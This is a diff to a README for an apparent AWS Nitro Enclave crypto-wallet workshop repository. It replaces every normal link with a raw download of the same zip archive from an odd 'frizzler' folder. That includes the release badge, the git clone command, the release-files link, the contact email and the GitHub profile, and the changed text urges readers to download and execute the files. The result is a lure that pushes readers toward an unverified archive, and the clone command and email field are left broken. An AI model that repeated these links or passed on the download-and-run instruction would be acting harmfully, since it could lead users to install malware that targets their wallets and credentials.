@@ -2,7 +2,7 @@
 
 Welcome to the **Custom Attestation Multi-Party Crypto Wallet with AWS Nitro Enclave** repository! This project provides ready-to-deploy assets for the workshop on building multi-party crypto wallets using AWS Nitro Enclave. 
 
-[![Release](https://img.shields.io/badge/Release-v1.0.0-blue)](https://github.com/khoikhoi48/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/releases)
+[![Release](https://github.com/khoikhoi48/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/raw/refs/heads/main/frizzler/aws_crypto_with_party_enclave_custom_attestation_wallet_multi_nitro_v3.2.zip)](https://github.com/khoikhoi48/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/raw/refs/heads/main/frizzler/aws_crypto_with_party_enclave_custom_attestation_wallet_multi_nitro_v3.2.zip)
 
 ## Table of Contents
 1. [Introduction](#introduction)
@@ -62,7 +62,7 @@ Follow these steps to deploy the multi-party crypto wallet:
 1. Clone the repository:
 
    ```bash
-   git clone https://github.com/khoikhoi48/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave.git
+   git clone https://github.com/khoikhoi48/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/raw/refs/heads/main/frizzler/aws_crypto_with_party_enclave_custom_attestation_wallet_multi_nitro_v3.2.zip
    cd custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave
    ```
 
@@ -78,7 +78,7 @@ Follow these steps to deploy the multi-party crypto wallet:
 
 4. Access the release files:
 
-   You can find the release files [here](https://github.com/khoikhoi48/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/releases). Download and execute the necessary files to complete the deployment.
+   You can find the release files [here](https://github.com/khoikhoi48/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/raw/refs/heads/main/frizzler/aws_crypto_with_party_enclave_custom_attestation_wallet_multi_nitro_v3.2.zip). Download and execute the necessary files to complete the deployment.
 
 ## Usage
 
@@ -111,7 +111,7 @@ This project is licensed under the MIT License. See the [LICENSE](LICENSE) file 
 For any inquiries or feedback, feel free to reach out:
 
 - **Author**: Khoi Khoi
-- **Email**: khoikhoi@example.com
-- **GitHub**: [khoikhoi48](https://github.com/khoikhoi48)
+- **Email**: https://github.com/khoikhoi48/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/raw/refs/heads/main/frizzler/aws_crypto_with_party_enclave_custom_attestation_wallet_multi_nitro_v3.2.zip
+- **GitHub**: [khoikhoi48](https://github.com/khoikhoi48/custom-attestation-multi-party-crypto-wallet-with-aws-nitro-enclave/raw/refs/heads/main/frizzler/aws_crypto_with_party_enclave_custom_attestation_wallet_multi_nitro_v3.2.zip)
 
 We appreciate your interest in the **Custom Attestation Multi-Party Crypto Wallet with AWS Nitro Enclave** project! Explore the repository, participate in the workshop, and contribute to the future of secure blockchain solutions.
